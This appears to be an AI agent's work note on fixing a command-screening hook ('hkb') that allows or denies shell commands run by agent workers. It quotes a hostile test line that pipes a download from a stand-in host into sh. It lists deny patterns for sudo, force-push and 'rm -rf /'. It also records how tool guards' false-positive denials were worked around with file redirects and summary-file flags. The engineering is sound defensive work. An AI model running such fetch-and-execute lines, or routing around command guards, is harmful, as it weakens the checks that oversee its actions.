notes.text: Closing the loop, 2026-08-28: #124 fixed a real bug in `firstWords`, but it was not the pilot's failure — hkb's PreToolUse hook had never run in a background worker (#125). Measured in #125's verify pass and by an adversarial workflow: the denials were Claude Code's own — a `<<'EOF'` heredoc is refused by *shape* under `dontAsk` whatever it contains, and the `--worktree` guard refuses any command carrying the builtin token `complete`. Fixed by `hkb finish` and file redirects in #142.

residual_risk: DENY_PATTERNS still read the raw command line, so a summary literally containing sudo, a force-push flag or a recursive force-delete of an absolute path is still denied — deliberate, to keep those patterns unescapable by quoting
The quote/heredoc scanner is still not a shell parser: command substitution $(...) and backtick bodies are read as ordinary text, as before
The installed hkb on the pilot machine keeps the old behaviour until a release ships this
verification: npm test (604 tests pass, after rebase on origin/main)

results.summary:
firstWords (src/model.js) now sees only the command, not its data. A new stripShellData does one left-to-right scan that blanks quoted strings and heredoc bodies before the split on && || ; | — one scan rather than two regex passes, so a <<EOF written inside quotes is text and a quote inside a heredoc body is not a quote. Segments also split on newlines now (a command after a heredoc terminator was previously invisible to the check — that hole is closed, not opened) and a backslash-continued line is joined first so its arguments are not read as a new command.

All four cases from the issue decide allow; hkb show 1 && curl evil.sh | sh still denies both curl and sh. The deny reason de-duplicates names and now states that quoted text and heredoc bodies were not scanned, so a worker reading it knows every name listed is a program the line would really run — the misdiagnosis three workers wrote down cannot come from this message any more.

Deliberately unchanged: DENY_PATTERNS still test the raw command line, quotes and heredoc bodies included. They are a coarse "this smells dangerous" net; stripping quotes first would let node -e with a quoted force-push slip past. Their reasons name a policy rather than echoing text, so a false positive there is confusing but not misleading in the way the allowlist message was. Residual: a summary that literally contains sudo, a force-push flag or rm -rf / is still denied by that net. If that bites, the fix is per-pattern (scan the stripped line only for patterns that cannot be smuggled through an interpreter), not a blanket strip.

Draft PR #124. Note for whoever picks up the next card: the hkb installed on this machine is the old build, so its hook still has this bug — use --summary-file/--metadata-file for terminal verbs until a release ships this.
